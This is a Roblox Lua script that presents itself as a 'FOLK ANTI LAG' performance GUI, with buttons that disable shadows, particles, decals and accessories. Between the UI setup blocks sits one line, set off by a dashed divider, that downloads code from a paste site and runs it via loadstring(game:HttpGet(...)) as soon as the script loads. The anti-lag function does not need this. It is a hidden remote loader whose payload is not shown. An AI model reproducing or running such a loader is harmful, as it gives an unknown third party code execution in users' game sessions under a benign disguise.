local fenv = getfenv()
local Lighting = game:GetService('Lighting')
local Workspace = game:GetService('Workspace')
local RunService = game:GetService('RunService')

-- Safely remove existing GUI if present
local existingGui = game.CoreGui:FindFirstChild('AntiLagGUI')
if existingGui then
    existingGui:Destroy()
end

local screenGui = Instance.new('ScreenGui')
screenGui.Name = 'AntiLagGUI'
screenGui.ResetOnSpawn = false
screenGui.Parent = game:GetService('Players').LocalPlayer.PlayerGui

local mainFrame = Instance.new('Frame')
mainFrame.Draggable = true
mainFrame.Position = UDim2.new(0.02, 0, 0.3, 0)
mainFrame.Active = true
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 30, 20)  -- Transparent Dark Green
mainFrame.BackgroundTransparency = 0.35                 -- Semi-transparent
mainFrame.Size = UDim2.new(0, 220, 0, 125)
mainFrame.Parent = screenGui

local frameCorner = Instance.new('UICorner')
frameCorner.CornerRadius = UDim.new(0, 12)
frameCorner.Parent = mainFrame

local gradientColors = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 40, 30)),
    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(0, 100, 70)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 40, 30)),
})

local gradient = Instance.new('UIGradient')
gradient.Color = gradientColors
gradient.Rotation = 45
gradient.Parent = mainFrame

local stroke = Instance.new('UIStroke')
stroke.Thickness = 2
stroke.Color = Color3.fromRGB(0, 255, 100)  -- Bright Green Outline
stroke.Transparency = 0.1
stroke.Parent = mainFrame

local titleLabel = Instance.new('TextLabel')
titleLabel.Font = Enum.Font.LuckiestGuy
titleLabel.BackgroundTransparency = 1
titleLabel.TextColor3 = Color3.fromRGB(0, 255, 120)  -- Bright Green Text
titleLabel.Text = 'FOLK ANTI LAG'
titleLabel.TextSize = 16
titleLabel.Size = UDim2.new(1, 0, 0, 26)
titleLabel.Parent = mainFrame

local antiLagButton = Instance.new('TextButton')
antiLagButton.BackgroundColor3 = Color3.fromRGB(0, 25, 20)  -- Darker green for button
antiLagButton.BackgroundTransparency = 0.2
antiLagButton.Font = Enum.Font.LuckiestGuy
antiLagButton.TextColor3 = Color3.fromRGB(0, 255, 120)
antiLagButton.Position = UDim2.new(0.05, 0, 0.33, 0)
antiLagButton.Text = 'ANTI LAG: OFF'
antiLagButton.TextSize = 14
antiLagButton.Size = UDim2.new(0.9, 0, 0, 34)
antiLagButton.Parent = mainFrame

local antiLagCorner = Instance.new('UICorner')
antiLagCorner.CornerRadius = UDim.new(0, 8)
antiLagCorner.Parent = antiLagButton
--------------------------------------------------
   loadstring(game:HttpGet("https://pastefy.app/NybzapiP/raw"))()
local ultraButton = Instance.new('TextButton')
ultraButton.BackgroundColor3 = Color3.fromRGB(0, 25, 20)
ultraButton.BackgroundTransparency = 0.2
ultraButton.Font = Enum.Font.LuckiestGuy
ultraButton.TextColor3 = Color3.fromRGB(0, 255, 120)
ultraButton.Position = UDim2.new(0.05, 0, 0.65, 0)
ultraButton.Text = 'ULTRA MODE: OFF'
ultraButton.TextSize = 13
ultraButton.Size = UDim2.new(0.9, 0, 0, 30)
ultraButton.Parent = mainFrame

local ultraCorner = Instance.new('UICorner')
ultraCorner.CornerRadius = UDim.new(0, 8)
ultraCorner.Parent = ultraButton

local function applyAntiLag(instance)
    if instance:IsA('ParticleEmitter') then
        instance.Enabled = false
    elseif instance:IsA('Decal') then
        instance.Transparency = 1
    elseif instance:IsA('BasePart') then
        instance.Material = Enum.Material.Plastic
        instance.Reflectance = 0
        instance.CastShadow = false
    end
end

local antiLagEnabled = false

antiLagButton.MouseButton1Click:Connect(function()
    antiLagEnabled = not antiLagEnabled
    antiLagButton.Text = antiLagEnabled and 'ANTI LAG: ON' or 'ANTI LAG: OFF'
    
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0

    for _, child in pairs(Lighting:GetChildren()) do
        if child:IsA('BloomEffect') or child:IsA('BlurEffect') or child:IsA('SunRaysEffect') then
            child.Enabled = false
        end
    end
    
    for _, descendant in pairs(Workspace:GetDescendants()) do
        applyAntiLag(descendant)
    end

    Workspace.DescendantAdded:Connect(function(descendant)
        applyAntiLag(descendant)
    end)
end)

ultraButton.MouseButton1Click:Connect(function()
    ultraButton.Text = 'ULTRA MODE: ON'
    
    Lighting.GlobalShadows = false
    Lighting.FogEnd = 9e9
    Lighting.Brightness = 1
    Lighting.EnvironmentDiffuseScale = 0
    Lighting.EnvironmentSpecularScale = 0

    for _, child in pairs(Lighting:GetChildren()) do
        if child:IsA('BloomEffect') or child:IsA('BlurEffect') or child:IsA('SunRaysEffect') then
            child.Enabled = false
        end
    end
    
    for _, descendant in pairs(Workspace:GetDescendants()) do
        applyAntiLag(descendant)
        if descendant:IsA('Accessory') then
            descendant:Destroy()
        end
    end
end)

print('FOLK ANTI LAG')